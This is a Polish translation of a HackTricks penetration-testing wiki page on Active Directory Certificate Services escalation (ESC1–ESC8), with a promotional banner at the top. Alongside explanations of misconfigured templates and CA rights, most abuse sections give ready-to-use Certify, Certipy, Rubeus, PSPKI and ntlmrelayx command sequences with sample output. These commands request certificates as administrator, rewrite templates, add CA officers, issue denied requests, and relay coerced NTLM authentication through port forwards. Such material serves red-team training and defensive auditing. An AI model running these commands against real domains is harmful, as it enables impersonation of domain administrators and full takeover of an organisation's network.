# Eskalacja domeny AD CS

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**To jest podsumowanie sekcji technik eskalacji z postów:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Błędnie skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Błędnie skonfigurowane szablony certyfikatów - ESC1 Wyjaśnione

* **Prawa do zapisu są przyznawane nisko uprzywilejowanym użytkownikom przez Enterprise CA.**
* **Zatwierdzenie menedżera nie jest wymagane.**
* **Nie są wymagane podpisy od upoważnionego personelu.**
* **Deskryptory zabezpieczeń na szablonach certyfikatów są zbyt liberalne, co pozwala nisko uprzywilejowanym użytkownikom uzyskać prawa do zapisu.**
* **Szablony certyfikatów są skonfigurowane tak, aby definiować EKU ułatwiające uwierzytelnianie:**
* Identyfikatory Extended Key Usage (EKU) takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA) są uwzględnione.
* **Możliwość dołączenia subjectAltName w żądaniu podpisania certyfikatu (CSR) jest dozwolona przez szablon:**
* Katalog Active Directory (AD) priorytetowo traktuje subjectAltName (SAN) w certyfikacie do weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że poprzez określenie SAN w CSR, certyfikat można zażądać w celu podszywania się pod dowolnego użytkownika (np. administratora domeny). Czy żądający może określić SAN jest wskazane w obiekcie AD szablonu certyfikatu za pomocą właściwości `mspki-certificate-name-flag`. Ta właściwość jest bitem maski, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` pozwala na określenie SAN przez żądającego.

{% hint style="danger" %}
Konfiguracja ta pozwala nisko uprzywilejowanym użytkownikom żądać certyfikatów z dowolnym SAN wyborem, umożliwiając uwierzytelnianie jako dowolny podmiot domeny za pośrednictwem Kerberos lub SChannel.
{% endhint %}

Ta funkcja jest czasami włączana w celu wsparcia generowania certyfikatów HTTPS lub hosta na żywo przez produkty lub usługi wdrożeniowe, lub z powodu braku zrozumienia.

Zauważono, że tworzenie certyfikatu z tą opcją powoduje ostrzeżenie, czego nie ma w przypadku istniejącego szablonu certyfikatu (takiego jak szablon `WebServer`, który ma włączone `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) jest duplikowany, a następnie zmodyfikowany w celu uwzględnienia OID uwierzytelniania.

### Nadużycie

Aby **znaleźć podatne szablony certyfikatów**, można uruchomić:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Aby **wykorzystać tę podatność do podszywania się pod administratora**, można uruchomić:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Następnie możesz przekształcić wygenerowany **certyfikat do formatu `.pfx`** i ponownie użyć go do **uwierzytelniania za pomocą Rubeus lub certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binaries "Certreq.exe" & "Certutil.exe" można użyć do wygenerowania pliku PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracja szablonów certyfikatów w schemacie konfiguracyjnym lasu AD, szczególnie tych nie wymagających zatwierdzenia ani podpisów, posiadających uwierzytelnianie klienta lub EKU logowania kartą inteligentną oraz z włączoną flagą `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, może być wykonana poprzez uruchomienie następującego zapytania LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Źle skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz nadużycia to wariacja pierwszego:

1. Uprawnienia do zapisu są przyznawane nisko uprzywilejowanym użytkownikom przez Enterprise CA.
2. Wymaganie zgody menedżera jest wyłączone.
3. Pominięto konieczność autoryzowanych podpisów.
4. Nadmiernie liberalny deskryptor zabezpieczeń na szablonie certyfikatu przyznaje uprawnienia do zapisu certyfikatu nisko uprzywilejowanym użytkownikom.
5. **Szablon certyfikatu jest zdefiniowany tak, aby zawierał dowolny cel EKU lub brak EKU.**

**Dowolny cel EKU** pozwala na uzyskanie certyfikatu przez atakującego do **dowolnego celu**, w tym uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu, itp. Ta sama **technika używana w ESC3** może być wykorzystana do wykorzystania tego scenariusza.

Certyfikaty **bez EKU**, które działają jako certyfikaty podrzędne CA, mogą być wykorzystane do **dowolnego celu** i mogą **również służyć do podpisywania nowych certyfikatów**. Dlatego atakujący mógłby określić dowolne EKU lub pola w nowych certyfikatach, korzystając z certyfikatu podrzędnego CA.

Jednakże, nowe certyfikaty utworzone do **uwierzytelniania domeny** nie będą działać, jeśli certyfikat podrzędny CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Niemniej jednak, atakujący nadal może tworzyć **nowe certyfikaty z dowolnym EKU** i arbitralnymi wartościami certyfikatu. Mogą one potencjalnie **być wykorzystane** do szerokiego zakresu celów (np. podpisywania kodu, uwierzytelniania serwera, itp.) i mogą mieć znaczące implikacje dla innych aplikacji w sieci, takich jak SAML, AD FS, czy IPSec.

Aby wyliczyć szablony pasujące do tego scenariusza w schemacie konfiguracji lasu AD, można uruchomić następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Niewłaściwie skonfigurowane szablony agenta zapisu - ESC3

### Wyjaśnienie

Ten scenariusz jest podobny do pierwszego i drugiego, ale **wykorzystuje** **inne EKU** (Agent żądania certyfikatu) i **2 różne szablony** (dlatego ma 2 zestawy wymagań),

**Agent żądania certyfikatu EKU** (OID 1.3.6.1.4.1.311.20.2.1), znany jako **Agent zapisu** w dokumentacji firmy Microsoft, umożliwia podmiotowi **zapisanie się** na **certyfikat w imieniu innego użytkownika**.

**"Agent zapisu"** zapisuje się w takim **szablonie** i używa wynikowego **certyfikatu do współpodpisywania CSR w imieniu innego użytkownika**. Następnie **wysyła** współpodpisany CSR do CA, zapisując się w **szablonie**, który **pozwala na "zapisanie się w imieniu"**, a CA odpowiada **certyfikatem należącym do "innego" użytkownika**.

**Wymagania 1:**

* Uprawnienia do zapisu są udzielane nisko uprzywilejowanym użytkownikom przez CA przedsiębiorstwa.
* Wymóg zgody menedżera jest pominięty.
* Brak wymogu podpisów autoryzowanych.
* Deskryptor zabezpieczeń szablonu certyfikatu jest nadmiernie przyzwalający, udzielając uprawnień do zapisu nisko uprzywilejowanym użytkownikom.
* Szablon certyfikatu zawiera EKU agenta żądania certyfikatu, umożliwiając żądanie innych szablonów certyfikatów w imieniu innych podmiotów.

**Wymagania 2:**

* CA przedsiębiorstwa udziela uprawnień do zapisu nisko uprzywilejowanym użytkownikom.
* Zgoda menedżera jest pomijana.
* Wersja schematu szablonu to albo 1, albo przekracza 2, i określa Wymaganie wydania zasady aplikacji, które wymaga EKU agenta żądania certyfikatu.
* EKU zdefiniowane w szablonie certyfikatu umożliwia uwierzytelnianie domeny.
* Ograniczenia dla agentów zapisu nie są stosowane w CA.

### Nadużycie

Możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy), aby nadużyć tego scenariusza:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Użytkownicy**, którzy mają prawo **uzyskać** certyfikat agenta **enrollment**, szablony, w których agenci **enrollment** mogą się zarejestrować, oraz **konta**, w imieniu których agent **enrollment** może działać, mogą być ograniczone przez przedsiębiorstwowe CA. Można to osiągnąć, otwierając `certsrc.msc` **snap-in**, **klikając prawym przyciskiem myszy na CA**, **klikając Właściwości**, a następnie **przechodząc** do karty "Agenci Enrollment".

Jednakże zauważono, że **domyślne** ustawienie dla CA to "Nie ograniczaj agentów enrollment". Gdy administratorzy włączają ograniczenie agentów enrollment, ustawiając je na "Ogranicz agentów enrollment", domyślna konfiguracja pozostaje bardzo liberalna. Pozwala to **Wszystkim** uzyskać dostęp do zapisu we wszystkich szablonach jako ktokolwiek.

## Kontrola dostępu do szablonów certyfikatów podatna na ataki - ESC4

### **Wyjaśnienie**

**Deskryptor zabezpieczeń** na **szablonach certyfikatów** określa **uprawnienia**, jakie posiadają konkretne **podmioty AD** w odniesieniu do szablonu.

Jeśli **atakujący** posiada wymagane **uprawnienia** do **zmiany** **szablonu** i **wprowadzenia** jakichkolwiek **wykorzystywanych błędów konfiguracyjnych** opisanych w **poprzednich sekcjach**, ułatwione może być eskalacja uprawnień.

Najważniejsze uprawnienia dotyczące szablonów certyfikatów to:

* **Właściciel:** Zapewnia kontrolę nad obiektem, umożliwiając modyfikację dowolnych atrybutów.
* **Pełna kontrola:** Umożliwia pełną kontrolę nad obiektem, w tym możliwość zmiany dowolnych atrybutów.
* **Zapisz właściciela:** Umożliwia zmianę właściciela obiektu na podmiot znajdujący się pod kontrolą atakującego.
* **ZapiszDacl:** Pozwala na dostosowanie kontroli dostępu, potencjalnie przyznając atakującemu pełną kontrolę.
* **ZapiszWłaściwość:** Uprawnia do edycji dowolnych właściwości obiektu.

### Nadużycie

Przykład eskalacji uprawnień podobny do poprzedniego:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 to sytuacja, gdy użytkownik ma uprawnienia do zapisu w szablonie certyfikatu. Może to być na przykład wykorzystane do nadpisania konfiguracji szablonu certyfikatu, aby uczynić szablon podatnym na ESC1.

Jak widać na powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nowy krawędź `AddKeyCredentialLink` do `JOHNPC`. Ponieważ ta technika dotyczy certyfikatów, zaimplementowałem również ten atak, który jest znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Oto mały podgląd polecenia `shadow auto` z Certipy do pobrania hasha NT ofiary.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** może nadpisać konfigurację szablonu certyfikatu jednym poleceniem. Domyślnie **Certipy** nadpisze konfigurację, aby uczynić ją podatną na **ESC1**. Możemy również określić parametr **`-save-old` w celu zapisania starej konfiguracji**, co będzie przydatne do **przywrócenia** konfiguracji po naszym ataku.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Podatny kontrola dostępu do obiektów PKI - ESC5

### Wyjaśnienie

Rozległa sieć powiązań oparta na listach kontroli dostępu (ACL), która obejmuje kilka obiektów poza szablonami certyfikatów i urzędem certyfikacyjnym, może wpłynąć na bezpieczeństwo całego systemu AD CS. Te obiekty, które mogą znacząco wpłynąć na bezpieczeństwo, obejmują:

* Obiekt komputera AD serwera CA, który może zostać skompromitowany poprzez mechanizmy takie jak S4U2Self lub S4U2Proxy.
* Serwer RPC/DCOM serwera CA.
* Dowolny obiekt potomny AD lub kontener w określonej ścieżce kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ta ścieżka obejmuje, między innymi, kontenery i obiekty takie jak kontener Szablony certyfikatów, kontener Certyfikujące urzędy, obiekt NTAuthCertificates i kontener Usługi zapisywania.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli nisko uprzywilejowany atakujący zdobędzie kontrolę nad którymkolwiek z tych kluczowych komponentów.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Wyjaśnienie

Temat omawiany w [**poście Akademii CQure**](https://cqureacademy.com/blog/enhanced-key-usage) dotyczy również implikacji flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, jak to opisano przez firmę Microsoft. Ta konfiguracja, gdy jest aktywowana na Urzędzie Certyfikacji (CA), pozwala na uwzględnienie **wartości zdefiniowanych przez użytkownika** w **alternatywnej nazwie podmiotu** dla **każdego żądania**, w tym tych skonstruowanych z Active Directory®. W rezultacie ta możliwość pozwala **intruzowi** na zapisanie się poprzez **dowolny szablon** ustawiony dla **uwierzytelniania domeny**—szczególnie tych otwartych dla zapisu przez **nieuprzywilejowanych** użytkowników, takich jak standardowy szablon Użytkownika. W rezultacie certyfikat może być zabezpieczony, umożliwiając intruzowi uwierzytelnienie się jako administrator domeny lub **dowolna inna aktywna jednostka** w domenie.

**Uwaga**: Sposób dodawania **alternatywnych nazw** do Wniosku o Wydanie Certyfikatu (CSR), poprzez argument `-attrib "SAN:"` w `certreq.exe` (nazywany „Pary Wartości Nazw”), prezentuje **kontrast** w porównaniu ze strategią eksploatacji SANów w ESC1. Tutaj różnica polega na **enkapsulacji informacji o koncie**—w atrybucie certyfikatu, a nie w rozszerzeniu.

### Nadużycie

Aby sprawdzić, czy ustawienie jest aktywowane, organizacje mogą skorzystać z następującej komendy z `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ta operacja wykorzystuje w zasadzie **zdalny dostęp do rejestru**, dlatego alternatywnym podejściem może być:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) potrafią wykryć tę błędną konfigurację i ją wykorzystać:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Aby zmienić te ustawienia, zakładając, że posiada się prawa **administratora domeny** lub równoważne, można wykonać poniższą komendę z dowolnej stacji roboczej:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Aby wyłączyć tę konfigurację w swoim środowisku, flagę można usunąć za pomocą:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Po aktualizacjach zabezpieczeń z maja 2022 r. nowo wydane **certyfikaty** będą zawierać **rozszerzenie zabezpieczeń**, które zawiera **właściwość `objectSid` żądającego**. Dla ESC1 SID ten jest pochodną określonego SAN. Jednakże dla **ESC6** SID odzwierciedla **`objectSid` żądającego**, a nie SAN.\
Aby wykorzystać ESC6, konieczne jest, aby system był podatny na ESC10 (Słabe mapowania certyfikatów), które priorytetowo traktuje **SAN nad nowym rozszerzeniem zabezpieczeń**.
{% endhint %}

## Wrażliwa kontrola dostępu do certyfikatu CA - ESC7

### Atak 1

#### Wyjaśnienie

Kontrola dostępu do certyfikatu CA jest utrzymywana poprzez zestaw uprawnień regulujących działania CA. Te uprawnienia można zobaczyć, przechodząc do `certsrv.msc`, klikając prawym przyciskiem myszy na CA, wybierając właściwości, a następnie przechodząc do karty Zabezpieczenia. Dodatkowo uprawnienia można wyliczyć, używając modułu PSPKI za pomocą poleceń takich jak:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
To zapewnia wgląd w podstawowe uprawnienia, mianowicie **`ManageCA`** i **`ManageCertificates`**, odpowiadające rolom "administratora CA" i "Menedżera certyfikatów" odpowiednio.

#### Nadużycie

Posiadanie uprawnień **`ManageCA`** w władzy certyfikacji umożliwia podmiotowi zdalne manipulowanie ustawieniami za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`** w celu zezwolenia na określenie SAN w dowolnym szablonie, co stanowi istotny aspekt eskalacji domeny.

Uproszczenie tego procesu jest osiągalne poprzez użycie polecenia **Enable-PolicyModuleFlag** w PSPKI, umożliwiające modyfikacje bez bezpośredniej interakcji z interfejsem GUI.

Posiadanie uprawnień **`ManageCertificates`** ułatwia zatwierdzanie oczekujących żądań, efektywnie omijając zabezpieczenie "zatwierdzenie przez menedżera certyfikatów CA".

Kombinacja modułów **Certify** i **PSPKI** może być wykorzystana do żądania, zatwierdzania i pobierania certyfikatu:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Atak 2

#### Wyjaśnienie

{% hint style="warning" %}
W **poprzednim ataku** wykorzystano uprawnienia **`Manage CA`** do **włączenia** flagi **EDITF\_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia ataku **ESC6**, ale nie będzie on miał żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie zrestartowana. Gdy użytkownik ma prawo dostępu `Manage CA`, ma również zezwolenie na **ponowne uruchomienie usługi**. Jednakże **nie oznacza to, że użytkownik może zdalnie zrestartować usługę**. Ponadto **ESC6 może nie działać od razu** w większości zaktualizowanych środowisk z powodu aktualizacji zabezpieczeń z maja 2022 roku.
{% endhint %}

Dlatego tutaj przedstawiony jest kolejny atak.

Wymagania wstępne:

* Tylko uprawnienie **`ManageCA`**
* Uprawnienie **`Manage Certificates`** (może być udzielone z uprawnienia **`ManageCA`**)
* Szablon certyfikatu **`SubCA`** musi być **włączony** (może być włączony z uprawnienia **`ManageCA`**)

Technika polega na tym, że użytkownicy posiadający prawo dostępu `Manage CA` _i_ `Manage Certificates` mogą **wydawać nieudane żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **podatny na ESC1**, ale **tylko administratorzy** mogą zapisać się do szablonu. Dlatego **użytkownik** może **złożyć** wniosek o zapisanie się do **`SubCA`** - który zostanie **odrzucony** - ale **następnie zostanie wydany przez menedżera**.

#### Nadużycie

Możesz **przyznać sobie uprawnienie `Manage Certificates`** dodając swojego użytkownika jako nowego oficera.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Szablon **`SubCA`** można **włączyć na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Jeśli spełniliśmy wymagane warunki dla tego ataku, możemy rozpocząć od **żądania certyfikatu opartego na szablonie `SubCA`**.

**To żądanie zostanie odrzucone**, ale zachowamy klucz prywatny i zapiszemy identyfikator żądania.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Z naszymi **`Zarządzaj CA` i `Zarządzaj Certyfikatami`**, możemy następnie **wydać nieudany certyfikat** żądanie za pomocą polecenia `ca` i parametru `-issue-request <ID żądania>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I wreszcie możemy **pobrać wydany certyfikat** za pomocą polecenia `req` i parametru `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## Przekazywanie NTLM do punktów końcowych HTTP AD CS – ESC8

### Wyjaśnienie

{% hint style="info" %}
W środowiskach, w których **zainstalowano AD CS**, jeśli istnieje **podatny punkt końcowy do zapisu w sieci Web** i co najmniej jeden **szablon certyfikatu jest opublikowany**, który pozwala na **zapis komputera domenowego i uwierzytelnianie klienta** (tak jak domyślny szablon **`Machine`**), staje się możliwe, że **dowolny komputer z aktywną usługą spoolera może zostać skompromitowany przez atakującego**!
{% endhint %}

AD CS obsługuje kilka **metod zapisu opartych na protokole HTTP**, udostępnianych poprzez dodatkowe role serwera, które administratorzy mogą zainstalować. Te interfejsy do zapisu certyfikatów opartych na protokole HTTP są podatne na **ataki przekazywania NTLM**. Atakujący z **skompromitowanego komputera może podszyć się pod dowolne konto AD, które uwierzytelnia się za pomocą przychodzącego NTLM**. Podszywając się pod konto ofiary, atakujący może uzyskać dostęp do tych interfejsów sieci Web, aby **żądać certyfikatu uwierzytelniania klienta, korzystając z szablonów certyfikatów `User` lub `Machine`**.

* Interfejs **zapisu sieci Web** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`), domyślnie obsługuje tylko protokół HTTP, który nie zapewnia ochrony przed atakami przekazywania NTLM. Dodatkowo, wyraźnie zezwala tylko na uwierzytelnianie NTLM za pomocą nagłówka HTTP Authorization, co uniemożliwia stosowanie bardziej bezpiecznych metod uwierzytelniania, takich jak Kerberos.
* Usługa **Zapisu Certyfikatów** (CES), **Usługa Sieci Web Polityki Zapisu Certyfikatów** (CEP) i **Usługa Zapisu Urządzeń Sieciowych** (NDES) domyślnie obsługują uwierzytelnianie negocjowane za pomocą nagłówka HTTP Authorization. Uwierzytelnianie negocjowane **obsługuje zarówno** Kerberos, jak i **NTLM**, pozwalając atakującemu **zmniejszyć poziom uwierzytelniania do NTLM** podczas ataków przekazywania. Chociaż te usługi sieci Web domyślnie obsługują protokół HTTPS, samo HTTPS **nie chroni przed atakami przekazywania NTLM**. Ochrona przed atakami przekazywania NTLM dla usług HTTPS jest możliwa tylko wtedy, gdy HTTPS jest łączone z powiązaniem kanału. Niestety AD CS nie aktywuje Rozszerzonej Ochrony dla Uwierzytelniania w IIS, co jest wymagane do powiązania kanału.

Powszechnym **problemem** z atakami przekazywania NTLM jest **krótki czas trwania sesji NTLM** i niemożność atakującego interakcji z usługami, które **wymagają podpisu NTLM**.

Niemniej jednak, to ograniczenie jest pokonywane poprzez wykorzystanie ataku przekazywania NTLM do uzyskania certyfikatu dla użytkownika, ponieważ okres ważności certyfikatu określa czas trwania sesji, a certyfikat może być używany z usługami, które **wymagają podpisu NTLM**. Aby uzyskać instrukcje dotyczące wykorzystania skradzionego certyfikatu, zapoznaj się z:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Kolejnym ograniczeniem ataków przekazywania NTLM jest to, że **maszyna kontrolowana przez atakującego musi zostać uwierzytelniona przez konto ofiary**. Atakujący może albo czekać, albo próbować **wymusić** to uwierzytelnienie:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Wykorzystanie**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` wylicza **włączone punkty końcowe AD CS protokołu HTTP**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez przedsiębiorstwowe władze certyfikujące (CAs) do przechowywania punktów końcowych Usługi Enrollingu Certyfikatów (CES). Te punkty końcowe mogą być analizowane i wyświetlane za pomocą narzędzia **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### Nadużycie z certyfikatem
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Wykorzystanie [Certipy](https://github.com/ly4k/Certipy)

Żądanie certyfikatu jest domyślnie wykonywane przez Certipy na podstawie szablonu `Machine` lub `User`, określonego na podstawie tego, czy nazwa konta kończy się na `$`. Określenie alternatywnego szablonu można osiągnąć poprzez użycie parametru `-template`.

Technika taka jak [PetitPotam](https://github.com/ly4k/PetitPotam) może być następnie wykorzystana do wymuszenia uwierzytelnienia. Przy pracy z kontrolerami domeny, konieczne jest określenie `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Brak rozszerzenia zabezpieczeń - ESC9 <a href="#id-5485" id="id-5485"></a>

### Wyjaśnienie

